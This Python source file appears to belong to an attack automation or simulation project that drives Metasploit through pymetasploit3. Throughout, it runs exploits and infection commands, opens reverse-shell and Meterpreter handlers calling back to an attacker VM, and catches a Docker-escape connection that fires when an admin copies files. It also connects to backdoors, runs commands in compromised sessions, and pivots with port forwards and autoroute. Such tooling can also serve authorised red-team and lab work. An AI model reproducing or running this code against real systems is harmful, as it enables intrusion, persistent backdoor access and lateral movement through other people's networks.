from pymetasploit3.msfrpc import MsfRpcClient
from util import Logger

from util import time_limit
from client import MetasploitWrapper
from time import sleep as delay
from util import Constants as C
from attack import Attack_DB
import subprocess

class MetaClient:
    

    def __init__(self, c_password, c_port, c_ip):
        # load database of machines
        # load database of attacks
        self.output = ""

        self.client = MetasploitWrapper(c_password, port=c_port, server=c_ip)
        if self.client:
            Logger.log(self, f"client connected - {c_ip=}, {c_port=}", level=Logger.INFO)
        #self.bc_client=bc
    
    
    def attempt_attack(self,attack,backdoor_port=0):
        sess= attack.execute()
        if not sess:
            return None
        compromised=sess["session_host"]
        success=None
        """ if backdoor_port != 0:
            Logger.log(self,f"establishing connection with backdoor - {compromised=}",level=Logger.INFO)
            for i in range(0, 5):
                success =self.bc_client.connect_to_backdoor(C.ATTACKER_VM, backdoor_port)
                if success:
                    Logger.log(self, f"connection with backdoor established- {compromised=}", level=Logger.INFO)
                    sess["backdoor_sess"]=success
                    break
                else:
                    Logger.log(self, f"can't establish connection with backdoor attempt {i} - {compromised=}", level=Logger.ERROR) """
        return compromised,sess
    
    def attempt_scan(self,scan_obj):
        scan_obj.scan()
        return
    
    def docker_escape(self,atk_sess):
        sess={}
        for i in range (0,5):
            success =self.grab_docker_escape_conn()
            if success:
                Logger.log(self, f"connection from netcat established, docker_escape successful", level=Logger.INFO)
                sess["escape_sess"]=success
                break
            else:
                Logger.log(self, f"can't establish connection from netcat attempt {i} -", level=Logger.ERROR)
        return sess
    

    #questo metodo viene solo usato per il doker escape, per catturare la connessione che arriva una volta che un admin effettua una operazione di copia 
    #sulla macchina infetta, permettendo così di farci avere una connessione sulla macchina effettuando il docker_escape
    def grab_docker_escape_conn(self, payload="linux/x86/shell_reverse_tcp", sleep=True):
        """
        If a new session is created it returns the ip of the compromised machine, else it returns None.
        """

        self.old_sessions = None
        self.new_sessions = None

        self.old_sessions = self.client.get_active_sessions(sleep=sleep)
        
        aus_client = self.client.client
        
        handler_p = aus_client.modules.use('payload', payload)
        handler_p['LHOST'] = C.ATTACKER_VM     # attacker ip
        handler_p['LPORT'] = C.NETCAT_PORT   # port defined in config file to connect to the netcat port used by docker_escape

        handler = aus_client.modules.use('exploit', 'multi/handler')
        #print(self.client.get_active_sessions(sleep=sleep))
        handler.execute(payload=handler_p)

        delay(10)

        self.new_sessions = self.client.get_active_sessions(sleep=sleep)
        #print(self.client.get_active_sessions(sleep=sleep))

        diff = set(self.new_sessions) - set(self.old_sessions)

        if diff:
            Logger.log(self, f"Netcat session created - {diff=}", level=Logger.INFO)
            return diff.pop()
        else:
            Logger.log(self, f"unable to create netcat session", level=Logger.ERROR)
            return None

    def infect(self):
        for atk in Attack_DB.infect_dict.keys():
            print(f"{C.COL_GREEN} Attacking with {atk}{C.COL_RESET}")
            p=subprocess.Popen(Attack_DB.infect_dict[atk].instruction,stdout=subprocess.DEVNULL,stderr=subprocess.STDOUT,shell=True)
            delay(Attack_DB.infect_dict[atk].wait_time)
            p.wait()
            #DEBUG
            #print(stdout)
    
    def upgrade_shell(self, sess,sleep=True):
        self.old_sessions = None
        self.new_sessions = None
        output=[]
        self.old_sessions = self.client.get_active_sessions(sleep=sleep)
        instr_str=C.METERPRETER_UPGRADE.format(C.ATTACKER_VM,C.METERPRETER_PORT, sess)
        instr_list=instr_str.split("\n")
        #print(instr_list)
        for i in instr_list:
            self.client.client.consoles.console(self.client.cid).write(i)
            if("resource" in i or "exploit" in i or "run" in i):
                delay(50)
            else:
                delay(1)
            out=self.client.client.consoles.console(self.client.cid).read()
            #print(out)
            output.append(out["data"])
        
        with time_limit(300):
            while self.client.client.consoles.console(self.client.cid).is_busy():
                delay(1)
                
        out = self.client.client.consoles.console(self.client.cid).read()

        delay(5)

        self.new_sessions = self.client.get_active_sessions(sleep=sleep)

        diff = set(self.new_sessions) - set(self.old_sessions)
            
        if diff:
            Logger.log(self, f"Meterpreter shell session created - {diff=}", level=Logger.INFO)
            print(f"{C.COL_YELLOW}[*] Meterpreter shell created with success{C.COL_RESET}")
            return diff.pop()
        else:
            Logger.log(self, f"unable to create meterpreter shell session", level=Logger.ERROR)
            print(f"{C.COL_RED}[-] Meterpreter shell was not created with success, can't add the routes required...{C.COL_RESET}")
            return None   

    def prepare(self, router, atk_port,exposed_port, atk_ip):
        cmd=C.ADD_PORTFWD.format(atk_ip,atk_port,exposed_port)
        #print(cmd)
        self.client.add_portfwd(router,cmd)
        return
class BackdoorCommander:
    """
    Class that manages backdoor operations.
    """

    def __init__(self, bc_password, bc_port, bc_ip):
        try:
            self.backdoor_client = MetasploitWrapper(bc_password, port=bc_port, server=bc_ip)
            if self.backdoor_client:
                Logger.log(self, f"backdoor client connected - {bc_ip=}, {bc_port=}", level=Logger.INFO)
        except Exception as e:
            Logger.log(self, f"backdoor client connection error - {bc_ip=}, {bc_port=}, {e=}", level=Logger.ERROR)
            pass

        self.old_sessions = self.backdoor_client.get_active_sessions(sleep=False)
        self.new_sessions = None

    def connect_to_backdoor(self, ip, port, backdoor_payload="linux/x86/meterpreter/reverse_tcp", sleep=True):
        """
        Connects to a meterpreter "backdoor" shell.

        If a new session is created it returns the ip of the compromised machine, else it returns None.
        """

        self.old_sessions = None
        self.new_sessions = None

        self.old_sessions = self.backdoor_client.get_active_sessions(sleep=sleep)
        
        aus_client = self.backdoor_client.client

        handler_p = aus_client.modules.use('payload', backdoor_payload)
        handler_p['LHOST'] = ip     # attacker ip
        handler_p['LPORT'] = port   # port defined in config file to connect to the backdoor

        handler = aus_client.modules.use('exploit', 'multi/handler')
        handler.execute(payload=handler_p)

        delay(2)

        self.new_sessions = self.backdoor_client.get_active_sessions(sleep=sleep)

        diff = set(self.new_sessions) - set(self.old_sessions)

        if diff:
            Logger.log(self, f"Backdoor session created - {diff=}", level=Logger.INFO)
            return diff.pop()
        else:
            Logger.log(self, f"unable to create backdoor session", level=Logger.ERROR)
            return None

    def interact_with_session(self, session_id, command):
        """
        Writes commands on a session shell.
        """
        Logger.log(self, f"backdoor client executing command - {session_id=}, {command=}", level=Logger.INFO)
        return self.backdoor_client.client.sessions.session(str(session_id)).runsingle(command)

    def route_traffic(self, session):
        """
        Opens new routes on a compromised machine
        """
        
        Logger.log(self, f"Running post/multi/manage/autoroute", level=Logger.INFO)

        return self.interact_with_session(session, "run post/multi/manage/autoroute")
